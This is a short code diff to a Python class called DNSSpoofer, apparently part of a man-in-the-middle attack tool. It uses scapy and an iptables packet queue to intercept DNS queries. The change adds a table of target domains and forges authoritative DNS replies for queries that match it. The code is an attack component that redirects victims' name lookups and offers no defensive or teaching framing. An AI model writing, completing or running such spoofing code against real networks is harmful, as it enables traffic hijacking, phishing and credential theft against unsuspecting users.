@@ -35,6 +35,7 @@ class DNSSpoofer(threading.Thread):
             logger.critical('Cannot execute iptables rulse!')
             sys.exit(-1)
         self.queue = queue
+        self.spoofaddr = {}
 
     def callback(self):
         payload = packet.get_payload()
@@ -42,9 +43,9 @@ class DNSSpoofer(threading.Thread):
 
         if not pkt.haslayer(DNSQR):
             packet.accept()
-            # TO IMPLEMENT
+            # TODO - edit packet if needed
         else:
-            if domain in pkt[DNS].qd.qname:
+            if pkt[DNS].qd.qname in self.spoofaddr:
                 spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                               UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                               DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, \
